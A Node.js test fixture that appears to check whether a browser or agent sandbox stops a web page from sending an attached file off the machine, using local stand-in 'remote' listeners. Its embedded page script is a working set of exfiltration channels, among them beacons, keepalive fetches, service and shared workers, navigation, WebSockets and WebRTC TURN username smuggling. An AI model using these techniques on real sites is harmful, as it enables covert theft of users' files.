#!/usr/bin/env node
// Fixture: local attack pages (loopback) that try to send an attached file off the machine, and "remote"
// listeners on this machine's non-loopback address (TCP and UDP; packets never leave the machine). Every byte the remote
// listeners receive is recorded; GET /log on the loopback server returns them. Usage: node exfil-site.mjs <lan ipv4>
import { createServer } from 'node:http';
import { createServer as tcpServer } from 'node:net';
import { createSocket } from 'node:dgram';

const LAN = process.argv[2];
const got = [], tried = []; // tried: loopback markers each attack sends right before its remote send (proof it ran)
const remote = tcpServer((s) => s.on('data', (d) => {
  got.push({ proto: 'tcp', bytes: d.length, head: d.toString('latin1').split('\r\n')[0].slice(0, 120) });
  s.end('HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok');
}));
await new Promise((r) => remote.listen(0, LAN, r));
const udp = createSocket('udp4');
udp.on('message', (m) => got.push({ proto: 'udp', bytes: m.length, head: m.subarray(0, 4).toString('hex') }));
await new Promise((r) => udp.bind(0, LAN, r));

const PAGE = `<!doctype html><title>attack</title><input type="file" id="f"><button id="go">go</button><script>
const q = new URLSearchParams(location.search), kind = q.get('kind'), T = JSON.parse(q.get('t') || '[]'), U = q.get('udp');
let text = '';
const post = (u, b) => fetch(u, { method: 'POST', body: b, mode: 'no-cors' }).catch(() => {});
const mark = (k) => fetch('/tried?k=' + k).catch(() => {});
f.onchange = async () => { text = await f.files[0].text(); if (kind === 'interval') setInterval(() => T.forEach((u) => post(u + '/i', text)), 50); };
// a tab the agent leaves (another tab opened in front) may send once more as it goes to the background
if (kind === 'interval') document.addEventListener('visibilitychange', () => T.forEach((u) => post(u + '/i', text)));
if (kind === 'sw') navigator.serviceWorker.register('/sw.js');
const shared = kind === 'shared' ? new SharedWorker('/shared.js') : null;
if (kind === 'pagehide') addEventListener('pagehide', () => T.forEach((u) => {
  navigator.sendBeacon('/tried?k=pagehide');
  navigator.sendBeacon(u + '/beacon', text); fetch(u + '/keepalive', { method: 'POST', body: text, keepalive: true, mode: 'no-cors' }).catch(() => {});
}));
go.onclick = async () => {
  text = text || await f.files[0].text();
  if (kind === 'sw') (await navigator.serviceWorker.ready).active.postMessage({ text, T });
  if (kind === 'shared') shared.port.postMessage({ text, T });
  if (kind === 'nav-storage') { sessionStorage.x = JSON.stringify({ text, T }); location = '/send.html'; }
  if (kind === 'nav-query') location = '/send.html?d=' + encodeURIComponent(JSON.stringify({ text, T }));
  if (kind === 'ws' || kind === 'webrtc') mark(kind);
  if (kind === 'ws') T.forEach((u) => new WebSocket(u.replace(/^http/, 'ws') + '/ws?d=' + encodeURIComponent(text)));
  if (kind === 'webrtc') {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'turn:' + U + '?transport=udp', username: 'U-' + text, credential: 'x' }, { urls: 'stun:' + U }] });
    pc.createDataChannel('d'); pc.setLocalDescription(await pc.createOffer());
  }
};
</script>`;
const SEND = `<!doctype html><title>send</title><script>
const d = JSON.parse(new URLSearchParams(location.search).get('d') || sessionStorage.x || '{}');
if (d.T) fetch('/tried?k=moved').catch(() => {});
(d.T || []).forEach((u) => fetch(u + '/moved', { method: 'POST', body: d.text, mode: 'no-cors' }).catch(() => {}));
</script>`;
const POSTER = "(m) => { fetch('/tried?k=worker').catch(() => {}); m.data.T.forEach((u) => fetch(u + '/worker', { method: 'POST', body: m.data.text, mode: 'no-cors' }).catch(() => {})); }";
const files = {
  '/attack': ['text/html', PAGE], '/send.html': ['text/html', SEND], '/next': ['text/html', '<title>next</title>local'],
  '/sw.js': ['text/javascript', `self.addEventListener('install', () => self.skipWaiting()); self.addEventListener('activate', (e) => e.waitUntil(clients.claim())); onmessage = ${POSTER};`],
  '/shared.js': ['text/javascript', `onconnect = (e) => { e.ports[0].onmessage = ${POSTER}; };`],
};
const local = createServer((req, res) => {
  const path = req.url.split('?')[0];
  if (path === '/log') { res.writeHead(200, { 'content-type': 'application/json' }); return res.end(JSON.stringify(got)); }
  if (path === '/tried') { tried.push(new URL(req.url, 'http://x').searchParams.get('k')); return res.end('ok'); }
  if (path === '/marks') { res.writeHead(200, { 'content-type': 'application/json' }); return res.end(JSON.stringify(tried)); }
  if (path === '/reset') { got.length = 0; tried.length = 0; return res.end('ok'); }
  const f = files[path];
  if (!f) { res.writeHead(404); return res.end('no'); }
  res.writeHead(200, { 'content-type': f[0] }); res.end(f[1]);
});
await new Promise((r) => local.listen(0, '::', r)); // dual stack: 127.0.0.1, localhost and [::1] all reach it
process.stdout.write(`${JSON.stringify({ local: local.address().port, tcp: remote.address().port, udp: udp.address().port })}\n`);
